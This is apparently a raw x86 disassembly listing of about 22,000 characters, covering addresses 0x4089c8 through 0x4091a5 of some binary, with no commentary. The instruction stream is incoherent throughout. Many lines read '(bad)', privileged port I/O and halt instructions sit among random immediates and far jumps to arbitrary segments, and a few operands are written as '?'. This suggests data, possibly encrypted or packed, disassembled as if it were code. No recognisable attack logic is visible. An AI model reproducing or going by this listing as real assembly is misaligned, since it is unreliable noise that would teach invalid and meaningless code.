  4089c8:	scas   al,BYTE PTR es:[edi]
  4089c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089ca:	mov    al,0x67
  4089cc:	stos   DWORD PTR es:[edi],eax
  4089cd:	pop    ebp
  4089ce:	sub    ah,BYTE PTR [edx+0x3b]
  4089d1:	fld    TBYTE PTR [eax+eiz*4-0x4a8bd203]
  4089d8:	push   edx
  4089d9:	(bad)
  4089de:	leave  
  4089df:	in     al,0xe5
  4089e1:	xchg   BYTE PTR [ebp+0x33],al
  4089e4:	push   edx
  4089e5:	add    al,0x85
  4089e7:	mov    esi,0x4a5ab3b9
  4089ec:	lods   al,BYTE PTR ds:[esi]
  4089ed:	jge    0x408a5c
  4089ef:	push   esi
  4089f0:	push   esp
  4089f1:	addr16 inc ecx
  4089f3:	xchg   esp,eax
  4089f4:	inc    esp
  4089f5:	adc    al,0x58
  4089f7:	rcr    BYTE PTR [edx],1
  4089f9:	pop    ss
  4089fa:	ins    DWORD PTR es:[edi],dx
  4089fb:	js     0x4089ff
  4089fd:	jo     0x408a7c
  4089ff:	adc    eax,0xfce0e645
  408a04:	dec    ebp
  408a05:	inc    esp
  408a06:	daa    
  408a07:	mov    eax,0xb0414cc1
  408a0c:	fbstp  TBYTE PTR [eax+0x63cf4f2]
  408a12:	jecxz  0x408a3d
  408a14:	mov    al,0x4f
  408a16:	inc    eax
  408a17:	mov    ecx,0xd1a030e4
  408a1c:	popa   
  408a1d:	scas   eax,DWORD PTR es:[edi]
  408a1e:	xchg   BYTE PTR [eax-0x3],ch
  408a21:	clc    
  408a22:	mov    ds:0xf47d12e5,eax
  408a27:	rol    DWORD PTR [edi-0x4a],1
  408a2a:	sbb    eax,0x79395fdc
  408a2f:	inc    esp
  408a30:	retf   0xedee
  408a33:	cmc    
  408a34:	sub    DWORD PTR [esi+0x6c92a280],eax
  408a3a:	aad    0x42
  408a3c:	or     eax,0x30c64f4a
  408a41:	loope  0x408a92
  408a43:	data16 or al,0xf7
  408a46:	push   ds
  408a47:	dec    ebp
  408a48:	outs   dx,BYTE PTR ds:[esi]
  408a49:	jp     0x408a4c
  408a4b:	sub    edx,DWORD PTR [ebx+0x1e]
  408a4e:	xor    bh,BYTE PTR ds:0xfb3c7d72
  408a54:	popf   
  408a55:	sub    DWORD PTR [esi-0x7216a199],ebx
  408a5b:	jle    0x408a55
  408a5d:	sbb    BYTE PTR [esi],bl
  408a5f:	sub    ecx,ecx
  408a61:	pop    ebp
  408a62:	pop    esi
  408a63:	jg     0x408a27
  408a65:	cmp    eax,0x9633a137
  408a6a:	push   ds
  408a6b:	mov    ecx,0xf1d5c49a
  408a70:	cmp    DWORD PTR [esi+edi*8-0x52],ecx
  408a74:	inc    edx
  408a75:	cmp    DWORD PTR [edi],ebp
  408a77:	or     ah,al
  408a79:	std    
  408a7a:	iret   
  408a7b:	mov    esp,0x24db4679
  408a80:	rol    DWORD PTR [ebx+0x8],cl
  408a83:	xor    BYTE PTR [ebp+0x5b],ch
  408a86:	test   eax,0xb68a068f
  408a8b:	scas   al,BYTE PTR es:[edi]
  408a8c:	ss nop
  408a8e:	fcomp  DWORD PTR [edx+0x16]
  408a91:	adc    eax,0x6e598cd6
  408a96:	xlat   BYTE PTR ds:[ebx]
  408a97:	mov    eax,ds:0x6d4ae7a3
  408a9c:	and    DWORD PTR ds:0xfc03e30c,eax
  408aa2:	xchg   ebx,eax
  408aa3:	adc    dl,al
  408aa5:	add    ah,cl
  408aa7:	fadd   DWORD PTR [eax-0x4960c53c]
  408aad:	inc    eax
  408aae:	aas    
  408aaf:	loopne 0x408b02
  408ab1:	jae    0x408ad2
  408ab3:	mov    bh,0x40
  408ab5:	stos   DWORD PTR es:[edi],eax
  408ab6:	xchg   ebx,eax
  408ab7:	mov    ah,0x82
  408ab9:	mov    es,WORD PTR [edx+eiz*8-0x30]
  408abd:	cwde   
  408abe:	mov    dl,BYTE PTR [eax]
  408ac0:	aas    
  408ac1:	mov    ch,0x9e
  408ac3:	je     0x408ab4
  408ac5:	cwde   
  408ac6:	lock xlat BYTE PTR ds:[ebx]
  408ac8:	jmp    0xc6f6:0x4d4100fb
  408acf:	cmc    
  408ad0:	or     ah,BYTE PTR [ebx]
  408ad2:	jnp    0x408b1e
  408ad4:	jae    0x408b46
  408ad6:	and    bh,0xca
  408ad9:	cdq    
  408ada:	and    DWORD PTR [ecx],eax
  408adc:	and    al,0x45
  408ade:	js     0x408ad5
  408ae0:	stos   BYTE PTR es:[edi],al
  408ae1:	imul   esp,DWORD PTR [ecx+0x41a4251c],0x7b
  408ae8:	fnsave ds:0x970be419
  408aee:	jp     0x408acd
  408af0:	pop    esi
  408af1:	cdq    
  408af2:	pop    ecx
  408af3:	dec    ecx
  408af4:	sub    esi,DWORD PTR [ebx+ebp*8]
  408af7:	jmp    0x8774afc8
  408afc:	jns    0x408ad8
  408afe:	cmp    ecx,DWORD PTR [ecx+0x63dcecf6]
  408b04:	das    
  408b05:	xor    al,ch
  408b07:	and    BYTE PTR [ebx-0x3b],bl
  408b0a:	dec    ebp
  408b0b:	mov    esi,0x938302d7
  408b10:	lea    eax,[ebx]
  408b12:	pop    ebp
  408b13:	aad    0xe8
  408b15:	retf   0xf7ad
  408b18:	enter  0xc383,0xb1
  408b1c:	jg     0x408b3a
  408b1e:	cld    
  408b1f:	pop    edx
  408b20:	(bad)  [eax]
  408b22:	inc    ecx
  408b23:	xchg   ebx,eax
  408b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b25:	(bad)  
  408b26:	mov    eax,ds:0x722867e3
  408b2b:	add    eax,0xbe1fa1f9
  408b30:	xor    al,0x1a
  408b32:	jno    0x408b83
  408b34:	xchg   DWORD PTR [eax+ebx*8+0x27],ecx
  408b38:	shl    BYTE PTR [edx-0x31947cfa],cl
  408b3e:	mov    ebp,0x9f86ae06
  408b43:	retf   0x5cdc
  408b46:	mov    WORD PTR [edi-0x45],gs
  408b49:	fdivr  QWORD PTR [esi-0x37]
  408b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b4d:	cmp    ecx,DWORD PTR [edx-0x16537aa3]
  408b53:	or     al,0x20
  408b55:	int3   
  408b56:	mov    edi,0xeb4497b9
  408b5b:	jmp    0xb5d:0x29e08479
  408b62:	daa    
  408b63:	xor    dh,dl
  408b65:	pop    eax
  408b66:	and    dh,BYTE PTR [ebx-0x14]
  408b69:	mov    edi,0x5a283ea9
  408b6e:	xchg   BYTE PTR [ebp*2+0x7fd2d384],ch
  408b75:	hlt    
  408b76:	push   eax
  408b77:	jno    0x408b7e
  408b79:	cld    
  408b7a:	xchg   ebx,eax
  408b7b:	jle    0x408b70
  408b7d:	cmpxchg edi,ecx
  408b80:	mov    bl,0x99
  408b82:	fdivr  st,st(1)
  408b84:	mov    ebp,0x321c86b2
  408b89:	mov    dl,0x56
  408b8b:	and    al,0xc2
  408b8d:	sbb    dh,BYTE PTR [ecx+0x3e37d8a]
  408b93:	dec    edi
  408b94:	dec    esi
  408b95:	sbb    BYTE PTR [edi+edx*1],0x54
  408b99:	int3   
  408b9a:	loopne 0x408b57
  408b9c:	outs   dx,BYTE PTR ds:[esi]
  408b9d:	push   ecx
  408b9e:	in     eax,0xc2
  408ba0:	aad    0x89
  408ba2:	cmp    BYTE PTR [edx+0x8],0xda
  408ba6:	lea    eax,[ebx-0x75]
  408ba9:	mov    edi,0xd0e8418e
  408bae:	sbb    eax,0x54638cba
  408bb3:	or     ch,BYTE PTR [ebx-0x59]
  408bb6:	inc    esi
  408bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bb8:	(bad)  
  408bb9:	(bad)  [eax+0x3c]
  408bbc:	dec    eax
  408bbd:	out    dx,al
  408bbe:	into   
  408bbf:	dec    ecx
  408bc0:	iret   
  408bc1:	pop    ebp
  408bc2:	(bad)  
  408bc3:	sti    
  408bc4:	pop    esp
  408bc5:	lea    edx,[edx]
  408bc7:	sub    BYTE PTR [ecx],bh
  408bc9:	dec    ax
  408bcb:	fist   WORD PTR [eax-0x7e]
  408bce:	jg     0x408ba6
  408bd0:	int3   
  408bd1:	sub    BYTE PTR [eax+0x3f5a8ae1],dl
  408bd7:	pop    ecx
  408bd8:	sbb    al,0x8d
  408bda:	mov    ax,ds:0xf6d496d3
  408be0:	dec    eax
  408be1:	sbb    DWORD PTR [esi+0xd],edi
  408be4:	and    dl,BYTE PTR [ebx+0x1e]
  408be7:	sub    esp,esp
  408be9:	lea    edx,[edx+eax*1]
  408bec:	pop    ebx
  408bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bee:	jb     0x408bc6
  408bf0:	cmc    
  408bf1:	(bad)  
  408bf2:	out    dx,eax
  408bf3:	aad    0x93
  408bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bf6:	add    DWORD PTR [edx],ecx
  408bf8:	and    DWORD PTR [bp+si+0x1d],ebp
  408bfc:	stos   BYTE PTR es:[edi],al
  408bfd:	jns    0x408b8f
  408bff:	dec    eax
  408c00:	fistp  QWORD PTR [edx]
  408c02:	pop    ebp
  408c03:	sbb    al,0x3c
  408c05:	(bad)  
  408c06:	popa   
  408c07:	test   eax,0x436c0729
  408c0c:	out    0xe6,al
  408c0e:	mov    ds:0xd576213a,eax
  408c13:	shl    DWORD PTR [edx-0x580d3006],1
  408c19:	call   0x2294:0x2d14c76b
  408c20:	sahf   
  408c21:	fdivr  st(6),st
  408c23:	pop    edx
  408c24:	fcmovne st,st(0)
  408c26:	std    
  408c27:	out    dx,eax
  408c28:	xchg   edx,eax
  408c29:	neg    DWORD PTR [ebx+0x6922cf4b]
  408c2f:	add    ebx,DWORD PTR [ebx-0x76d53508]
  408c35:	push   cs
  408c36:	xchg   esp,eax
  408c37:	test   BYTE PTR [ecx],al
  408c39:	cmp    al,BYTE PTR [eax]
  408c3b:	iret   
  408c3c:	mov    eax,ds:0x6c18dc4b
  408c41:	and    dl,BYTE PTR [edi+ebp*2]
  408c44:	vpminub ymm7,ymm1,ymm2
  408c48:	dec    ebp
  408c49:	cdq    
  408c4a:	mov    cl,0xf4
  408c4c:	cmp    BYTE PTR cs:[eax],0x66
  408c50:	cmp    DWORD PTR [eax],ecx
  408c52:	dec    esi
  408c53:	pop    ds
  408c54:	adc    cl,BYTE PTR ds:0x2d81b28e
  408c5a:	dec    ecx
  408c5b:	popa   
  408c5c:	xor    BYTE PTR [edi],dh
  408c5e:	push   0x44b170c3
  408c63:	mov    ebp,0xc8b59d44
  408c68:	cmp    al,0x90
  408c6a:	fcom   DWORD PTR [eax]
  408c6c:	lahf   
  408c6d:	mov    dl,0x4
  408c6f:	jne    0x408c37
  408c71:	inc    edi
  408c72:	inc    eax
  408c73:	in     eax,0x35
  408c75:	push   0xa75c524b
  408c7a:	enter  0x3342,0x94
  408c7e:	loope  0x408c73
  408c80:	sahf   
  408c81:	out    dx,al
  408c82:	jecxz  0x408c96
  408c84:	(bad)  
  408c85:	arpl   bp,bp
  408c87:	jnp    0x408c11
  408c89:	mov    al,0x2f
  408c8b:	icebp  
  408c8c:	(bad)  
  408c8d:	fidivr DWORD PTR [esp+ebx*4-0x7a]
  408c91:	sub    eax,0xd6a9f6ac
  408c96:	cmp    DWORD PTR [edi+esi*8+0x72],edx
  408c9a:	xchg   ebp,eax
  408c9b:	jg     0x408cc9
  408c9d:	sbb    DWORD PTR [edx],ebp
  408c9f:	mov    ebp,0xb045ce03
  408ca4:	dec    ebp
  408ca5:	ret    
  408ca6:	push   ebp
  408ca7:	xor    BYTE PTR [edi-0x71],dl
  408caa:	mov    eax,0xe4318545
  408caf:	es les edx,FWORD PTR fs:[ebp-0x406d6353]
  408cb7:	mov    eax,0x24366162
  408cbc:	sti    
  408cbd:	in     eax,dx
  408cbe:	push   ebp
  408cbf:	lods   al,BYTE PTR ds:[esi]
  408cc0:	jle    0x408c97
  408cc2:	sti    
  408cc3:	test   eax,0x9278815c
  408cc8:	(bad)  [edi]
  408cca:	and    eax,0xda945a80
  408ccf:	retf   
  408cd0:	push   ss
  408cd1:	call   0xbfc98849
  408cd6:	outs   dx,BYTE PTR ds:[esi]
  408cd7:	sbb    edi,DWORD PTR [ecx-0x1062e31]
  408cdd:	popa   
  408cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cdf:	sbb    al,0x74
  408ce1:	pop    edx
  408ce2:	add    ecx,ebx
  408ce4:	out    0x2f,eax
  408ce6:	lahf   
  408ce7:	mov    al,ds:0x126242e1
  408cec:	aam    0xc0
  408cee:	in     al,0x91
  408cf0:	mov    dl,BYTE PTR [ecx]
  408cf2:	jb     0x408c89
  408cf4:	lock mov cl,BYTE PTR [eax]
  408cf7:	inc    esi
  408cf8:	sbb    edx,DWORD PTR [edx+eax*8-0x13]
  408cfc:	and    cl,bl
  408cfe:	sub    al,0x6
  408d00:	push   ecx
  408d01:	(bad)  
  408d02:	adc    edi,ecx
  408d04:	adc    al,0x9a
  408d06:	out    0x83,al
  408d08:	mov    cl,BYTE PTR [ecx]
  408d0a:	push   ds
  408d0b:	sti    
  408d0c:	xchg   ebp,eax
  408d0d:	mov    esi,0x25ee87b
  408d12:	retf   0x17fb
  408d15:	jecxz  0x408cdc
  408d17:	shl    DWORD PTR [eiz*4+0x6626ce72],1
  408d1e:	mov    dh,0xdd
  408d20:	dec    ebp
  408d21:	sbb    DWORD PTR [edi-0x1348bfbc],0x1db62894
  408d2b:	loope  0x408d2e
  408d2d:	adc    esp,DWORD PTR [ecx]
  408d2f:	mov    ds,WORD PTR ds:0xc9c2e204
  408d35:	test   BYTE PTR [edi-0xb],bh
  408d38:	(bad)  
  408d39:	mov    ebx,0x98372ae6
  408d3e:	test   eax,0x739b997
  408d43:	adc    BYTE PTR [edi+0x1],ah
  408d46:	jns    0x408d87
  408d48:	jno    0x408dbb
  408d4a:	out    dx,al
  408d4b:	test   BYTE PTR [edx],0xb1
  408d4e:	clc    
  408d4f:	rcr    BYTE PTR [edx+0x72],cl
  408d52:	popf   
  408d53:	es (bad) 
  408d55:	das    
  408d56:	and    DWORD PTR [edi+ecx*4+0x7c4317ac],edi
  408d5d:	cdq    
  408d5e:	enter  0x288c,0xe4
  408d62:	lods   eax,DWORD PTR ds:[esi]
  408d63:	jb     0x408dd6
  408d65:	ror    BYTE PTR [edi],0xa9
  408d68:	imul   eax,DWORD PTR [edx-0x80],0x191595ed
  408d6f:	jbe    0x408dd6
  408d71:	adc    al,0x27
  408d73:	ins    BYTE PTR es:[edi],dx
  408d74:	sbb    cl,0x54
  408d77:	scas   al,BYTE PTR es:[edi]
  408d78:	and    edi,DWORD PTR [ebx+0x52]
  408d7b:	ss mov dh,0x82
  408d7e:	cmp    al,0xde
  408d80:	push   eax
  408d81:	mov    bl,BYTE PTR [edi]
  408d83:	pushf  
  408d84:	cmp    eax,0xb6669ab3
  408d89:	add    BYTE PTR [eax],bh
  408d8b:	xor    BYTE PTR [edi+ecx*8-0x76f50c7f],0x89
  408d93:	int    0xdf
  408d95:	rcr    ebx,cl
  408d97:	push   edi
  408d98:	les    cx,DWORD PTR [esi-0x4ac5d9df]
  408d9f:	(bad)  
  408da0:	adc    eax,0x2bcbff3c
  408da5:	nop
  408da6:	fcmovne st,st(4)
  408da8:	clc    
  408da9:	xchg   ecx,eax
  408daa:	sbb    al,0xee
  408dac:	or     DWORD PTR [ecx+0x4e7cf436],edi
  408db2:	into   
  408db3:	push   0xdb6b94dd
  408db8:	out    dx,al
  408db9:	xor    dl,BYTE PTR [ebx+0x78c06547]
  408dbf:	mov    eax,ebp
  408dc1:	(bad)  
  408dc2:	push   ss
  408dc3:	ss repnz jmp 0xd554:0xb4fce690
  408dcc:	mov    ch,0xd5
  408dce:	sbb    eax,0x8d8fe442
  408dd3:	mov    esp,0x9ba3a3ce
  408dd8:	gs jecxz 0x408d78
  408ddb:	pop    es
  408ddc:	int    0xa
  408dde:	inc    ch
  408de0:	bound  ebx,QWORD PTR [ebp-0xb454044]
  408de6:	pushf  
  408de7:	xor    bh,ch
  408de9:	rcl    DWORD PTR [eax-0x74507e07],0xca
  408df0:	arpl   WORD PTR [edi],bp
  408df2:	les    esi,FWORD PTR [ecx+0x6]
  408df5:	(bad)  
  408df6:	mov    BYTE PTR [edi-0x2011ddf],bl
  408dfc:	mov    ecx,0x1e4750be
  408e01:	xchg   esi,eax
  408e02:	add    al,0xe9
  408e04:	test   BYTE PTR [eax+0x8f4eef4],cl
  408e0a:	jno    0x408da1
  408e0c:	mov    ds:0x9ae16c7f,eax
  408e11:	mov    bl,dl
  408e13:	enter  0x9c6d,0x5b
  408e17:	bound  ebp,QWORD PTR [esi]
  408e19:	cmc    
  408e1a:	mov    dh,0x9b
  408e1c:	mov    ds:0x43edc775,al
  408e21:	pop    ecx
  408e22:	aam    0x2
  408e24:	jae    0x408e54
  408e26:	sti    
  408e27:	push   edi
  408e28:	repnz repz pusha 
  408e2b:	call   0x3612:0x906db031
  408e32:	fistp  DWORD PTR [ecx]
  408e34:	ins    BYTE PTR es:[edi],dx
  408e35:	rol    DWORD PTR [edi-0xfb3362a],cl
  408e3b:	loop   0x408ddb
  408e3d:	dec    edi
  408e3e:	and    al,0xac
  408e40:	pusha  
  408e41:	js     0x408e6f
  408e43:	inc    esp
  408e44:	or     eax,0x2413a0fa
  408e49:	lock xchg ecx,eax
  408e4b:	xor    DWORD PTR ds:0xc82cbbd,edx
  408e51:	inc    ecx
  408e52:	adc    edi,DWORD PTR [esi+0x12]
  408e55:	(bad)  
  408e56:	and    eax,0x2b16d8f1
  408e5b:	and    ch,BYTE PTR [ecx-0x1abe8b8]
  408e61:	push   0x7d64ba40
  408e66:	icebp  
  408e67:	dec    esp
  408e68:	mov    ecx,0xdf4a1f70
  408e6d:	and    al,0x61
  408e6f:	pop    edx
  408e70:	jmp    DWORD PTR [ebp-0x3b161f62]
  408e76:	xchg   ebx,eax
  408e77:	add    ah,al
  408e79:	and    al,BYTE PTR [esi+0x3b]
  408e7c:	jae    0x408e54
  408e7e:	test   DWORD PTR [esi-0x58],ebp
  408e81:	outs   dx,BYTE PTR ds:[esi]
  408e82:	sbb    eax,0x7c9fe9
  408e87:	ins    BYTE PTR es:[edi],dx
  408e88:	push   ecx
  408e89:	mov    bl,0xc2
  408e8b:	ss xchg ebp,eax
  408e8d:	pop    eax
  408e8e:	mov    esp,0xe342d28f
  408e93:	xchg   edi,eax
  408e94:	dec    eax
  408e95:	fisttp WORD PTR [ebx+0x4d]
  408e98:	jmp    0x9a526463
  408e9d:	cmp    DWORD PTR [esi],esi
  408e9f:	mov    ch,0x41
  408ea1:	outs   dx,BYTE PTR ds:[esi]
  408ea2:	add    eax,0xb1d900fc
  408ea7:	loope  0x408eef
  408ea9:	cli    
  408eaa:	rol    BYTE PTR ds:0xfe09babf,1
  408eb0:	stos   DWORD PTR es:[edi],eax
  408eb1:	push   es
  408eb2:	lea    edx,[ebx-0x5c]
  408eb5:	nop
  408eb6:	jmp    0x408e4c
  408eb8:	cmp    al,0x1
  408eba:	ret    
  408ebb:	jno    0x408e96
  408ebd:	test   al,0x66
  408ebf:	iret   
  408ec0:	mov    edx,?
  408ec2:	and    edx,esi
  408ec4:	mov    al,0x8e
  408ec6:	stc    
  408ec7:	push   es
  408ec8:	ds sub al,0x96
  408ecb:	aaa    
  408ecc:	jmp    0x6c2f22bb
  408ed1:	(bad)  
  408ed2:	les    esi,FWORD PTR [ebp+0x24124293]
  408ed8:	pop    ds
  408ed9:	rcl    esi,cl
  408edb:	push   ebx
  408edc:	loope  0x408ec5
  408ede:	loope  0x408e94
  408ee0:	ror    DWORD PTR [esi-0x37],cl
  408ee3:	fucomp st(0)
  408ee5:	xor    esi,DWORD PTR [edx-0x3d4ceeef]
  408eeb:	ins    BYTE PTR es:[edi],dx
  408eec:	enter  0x9e31,0xa1
  408ef0:	mul    DWORD PTR [eax]
  408ef2:	aad    0x4a
  408ef4:	outs   dx,DWORD PTR ds:[esi]
  408ef5:	pop    esi
  408ef6:	shl    BYTE PTR [ebp-0x5687d169],1
  408efc:	out    dx,al
  408efd:	jne    0x408ef6
  408eff:	ds push esi
  408f01:	or     bl,BYTE PTR [ebp+0x40]
  408f04:	jmp    0x6b15e906
  408f09:	aad    0x29
  408f0b:	xchg   edi,eax
  408f0c:	mov    ebp,0x63d0fa82
  408f11:	repz adc eax,0xdc363906
  408f17:	sahf   
  408f18:	adc    DWORD PTR [ecx],esi
  408f1a:	mov    ecx,0x6d4c59ac
  408f1f:	and    eax,0x567d2091
  408f24:	jg     0x408f3f
  408f26:	loop   0x408f0a
  408f28:	jl     0x408ef4
  408f2a:	(bad)  
  408f2b:	ins    DWORD PTR es:[edi],dx
  408f2c:	pop    ebx
  408f2d:	ret    0x1187
  408f30:	call   0x17e7:0x97b4cad
  408f37:	ins    DWORD PTR es:[edi],dx
  408f38:	mov    esp,0x30d0046c
  408f3d:	aam    0x7f
  408f3f:	fnstenv [edi-0x1f8d9912]
  408f45:	pop    ax
  408f47:	pop    eax
  408f48:	ja     0x408ecd
  408f4a:	cld    
  408f4b:	(bad)  
  408f4c:	(bad)  
  408f4e:	mov    al,0x37
  408f50:	dec    edi
  408f51:	pusha  
  408f52:	mov    edx,0x71db4fa6
  408f57:	and    eax,0xcb709de6
  408f5c:	or     BYTE PTR [edx],dl
  408f5e:	mov    WORD PTR [ebx+esi*2-0xed5f4b8],cs
  408f65:	enter  0xbe42,0xb4
  408f69:	rol    edx,1
  408f6b:	ds test bh,0xce
  408f6f:	adc    ebp,DWORD PTR [ecx+0x6b439e2e]
  408f75:	xor    dh,BYTE PTR [edi+0x6d47d1e5]
  408f7b:	mov    dl,0xc5
  408f7d:	or     eax,0x51b9c233
  408f82:	adc    DWORD PTR [ebx],eax
  408f84:	out    dx,eax
  408f85:	das    
  408f86:	(bad)  
  408f87:	fwait
  408f88:	cmp    eax,0x56aa6dbd
  408f8d:	inc    eax
  408f8e:	inc    edi
  408f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f90:	popf   
  408f91:	(bad)  
  408f92:	push   ecx
  408f93:	dec    ecx
  408f94:	pop    ss
  408f95:	fiadd  WORD PTR [esi-0x5b]
  408f98:	(bad)
  408f9c:	mov    ecx,0x5642973b
  408fa1:	xchg   esp,eax
  408fa2:	and    al,0x3f
  408fa4:	and    dl,BYTE PTR ds:0xf622e0be
  408faa:	push   0xffffffff
  408fac:	sbb    BYTE PTR [eax-0x2028df46],ah
  408fb2:	hlt    
  408fb3:	jno    0x408fae
  408fb5:	push   esp
  408fb6:	fst    QWORD PTR [ebx-0x517568e4]
  408fbc:	xor    al,0xb2
  408fbe:	in     eax,dx
  408fbf:	pop    edx
  408fc0:	(bad)  
  408fc2:	mov    fs,WORD PTR [esi+0x2dfcc69c]
  408fc8:	and    eax,0xa6d98e25
  408fcd:	ret    0x8fd1
  408fd0:	cmp    ch,BYTE PTR [edi-0x1a]
  408fd3:	out    0x5b,al
  408fd5:	out    0x40,eax
  408fd7:	dec    ebp
  408fd8:	in     eax,dx
  408fd9:	jno    0x408f83
  408fdb:	mov    ds:0x263c536a,al
  408fe0:	cmp    BYTE PTR [ebp-0x80956b],ah
  408fe6:	add    ch,BYTE PTR [esi+0x44]
  408fe9:	fwait
  408fea:	mov    ch,0x53
  408fec:	dec    edx
  408fed:	sahf   
  408fee:	sub    esp,ebp
  408ff0:	dec    eax
  408ff1:	sbb    esp,ebp
  408ff3:	imul   eax,DWORD PTR [ebp-0x71],0xb6438da9
  408ffa:	and    eax,0x636b5be2
  408fff:	cmp    DWORD PTR [edi+ebp*2-0x56],ebx
  409003:	push   ecx
  409004:	sbb    eax,0x3806d2ad
  409009:	pusha  
  40900a:	sbb    DWORD PTR [esp+ebp*1+0x1b862cab],edx
  409011:	es call 0x8f3d29fc
  409017:	jg     0x409097
  409019:	cmc    
  40901a:	pop    ds
  40901b:	test   eax,0x2193d029
  409020:	and    al,dl
  409022:	loop   0x40909a
  409024:	push   es
  409025:	mov    eax,ds:0x8cabaae9
  40902a:	(bad)  
  40902b:	js     0x408fe8
  40902d:	mov    ds:0x260142ff,eax
  409032:	push   ebp
  409033:	sub    dx,WORD PTR [esi]
  409036:	mov    BYTE PTR [esi+0x12],bh
  409039:	xor    eax,0xedcb9e67
  40903e:	xchg   DWORD PTR [esi-0x1d2f2f47],edx
  409044:	loopne 0x409095
  409046:	fisubr WORD PTR [ecx+ebp*1]
  409049:	or     esi,ebp
  40904b:	retf   0x8bd9
  40904e:	xlat   BYTE PTR ds:[ebx]
  40904f:	stc    
  409050:	sbb    bl,cl
  409052:	sub    cl,dl
  409054:	stos   DWORD PTR es:[edi],eax
  409055:	pop    es
  409056:	ss xchg edi,eax
  409058:	lods   al,BYTE PTR ds:[esi]
  409059:	or     cl,BYTE PTR [ebp-0x55efa6e3]
  40905f:	jl     0x408fec
  409061:	int    0x3f
  409063:	cmp    DWORD PTR [edi+ebp*8],edi
  409066:	sbb    BYTE PTR [esi-0x7fefff3c],cl
  40906c:	jno    0x408ff8
  40906e:	(bad)  
  40906f:	push   ebp
  409070:	rcr    esi,0x95
  409073:	mov    esp,0xb4868773
  409078:	icebp  
  409079:	hlt    
  40907a:	xor    BYTE PTR [edx+0x33],dh
  40907d:	adc    DWORD PTR [edx+0x2d],esi
  409080:	sti    
  409081:	pop    ecx
  409082:	leave  
  409083:	pop    ebx
  409084:	dec    ebx
  409085:	or     ch,al
  409087:	sub    DWORD PTR [edx+0x3e],eax
  40908a:	xor    bh,BYTE PTR [edx-0x51]
  40908d:	out    dx,eax
  40908e:	push   esi
  40908f:	push   esi
  409090:	adc    DWORD PTR [eax],eax
  409092:	and    dl,ah
  409094:	jmp    0x7359deca
  409099:	js     0x40905e
  40909b:	mov    ch,BYTE PTR [esi+ecx*2+0x1771b518]
  4090a2:	je     0x4090fc
  4090a4:	push   eax
  4090a5:	cli    
  4090a6:	add    al,0xe0
  4090a8:	(bad)  
  4090aa:	mov    eax,ds:0x54648c62
  4090af:	clc    
  4090b0:	shl    DWORD PTR [esi-0x1756086b],cl
  4090b6:	loop   0x40909a
  4090b8:	push   es
  4090b9:	sbb    DWORD PTR [eax+0x21],0xffffffa8
  4090bd:	mov    ds:0x3f7153b6,eax
  4090c2:	inc    eax
  4090c3:	cwde   
  4090c4:	repnz cli 
  4090c6:	jge    0x409114
  4090c8:	test   BYTE PTR [edx],dh
  4090ca:	shl    BYTE PTR [ebx-0x36fdedd8],0x36
  4090d1:	and    ecx,ecx
  4090d3:	jge    0x4090c0
  4090d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090d6:	imul   edi,ebp,0xc90009dd
  4090dc:	ss mov ecx,0x9c336c0f
  4090e2:	outs   dx,BYTE PTR ds:[esi]
  4090e3:	mov    dh,0x8d
  4090e5:	jo     0x409085
  4090e7:	xchg   ecx,eax
  4090e8:	shr    DWORD PTR [ebp+0x2e],cl
  4090eb:	ret    0xfbd7
  4090ee:	cmp    eax,0xecfcfe38
  4090f3:	pop    edi
  4090f4:	mov    eax,ds:0x260e3055
  4090f9:	add    DWORD PTR [ebx+0x4de4a37],ebx
  4090ff:	test   DWORD PTR [esi+0x44],ebx
  409102:	add    al,0x3c
  409104:	push   es
  409105:	icebp  
  409106:	mov    al,ds:0x5cd4bd3c
  40910b:	jmp    0x40911b
  40910d:	dec    esi
  40910e:	mov    ds:0x37241e39,al
  409113:	popf   
  409114:	xchg   edi,eax
  409115:	jge    0x40914f
  409117:	dec    esp
  409118:	add    bh,dl
  40911a:	jge    0x4090fa
  40911c:	loopne 0x409165
  40911e:	pushf  
  40911f:	cmp    ebx,DWORD PTR [edi]
  409121:	retf   0xd4d9
  409124:	add    BYTE PTR [ebx+ecx*1+0xb],bh
  409128:	mov    esp,?
  40912a:	xor    BYTE PTR [ecx],al
  40912c:	xor    al,0xec
  40912e:	int    0x5f
  409130:	push   edx
  409131:	leave  
  409132:	push   edx
  409133:	popf   
  409134:	ins    DWORD PTR es:[edi],dx
  409135:	pop    ebp
  409136:	js     0x40913d
  409138:	imul   ebx,DWORD PTR [ecx+0x2e],0xffffff92
  40913c:	xor    eax,0xdddbc87d
  409141:	mov    eax,DWORD PTR [eax+0x36]
  409144:	sti    
  409145:	cld    
  409146:	xchg   esp,eax
  409147:	test   eax,0x87fcaa24
  40914c:	hlt    
  40914d:	stc    
  40914e:	xchg   esi,eax
  40914f:	scas   al,BYTE PTR es:[edi]
  409150:	push   es
  409151:	fcom   QWORD PTR [esi+eiz*1-0x591ff58b]
  409158:	xchg   ecx,eax
  409159:	mov    DWORD PTR [ecx-0x37],eax
  40915c:	mov    ebx,0xaf0705e2
  409161:	pop    es
  409162:	mov    al,ds:0xac84384c
  409167:	cmp    BYTE PTR [edi+eiz*1+0x30910429],dh
  40916e:	pop    edi
  40916f:	inc    esi
  409170:	mov    edi,DWORD PTR [esi]
  409172:	cs pop es
  409174:	sbb    ah,bh
  409176:	inc    ebp
  409177:	call   0x24a4:0x57c5cc4b
  40917e:	mov    cl,0x78
  409180:	xor    ah,BYTE PTR [esi+0xe]
  409183:	pop    ebx
  409184:	ret    
  409185:	out    0x92,al
  409187:	fisubr WORD PTR [edx]
  409189:	mov    ch,0xaa
  40918b:	outs   dx,BYTE PTR ds:[esi]
  40918c:	mov    edi,0x682ca5a5
  409191:	xor    BYTE PTR [esi*8+0x5eea47da],ch
  409198:	mov    cl,0xd4
  40919a:	ja     0x4091d6
  40919c:	or     al,0xbe
  40919e:	in     eax,0x82
  4091a0:	mov    ds:0x8128232e,eax
  4091a5:	cmp    ah,BYTE PTR [ebx-0x495ac631]
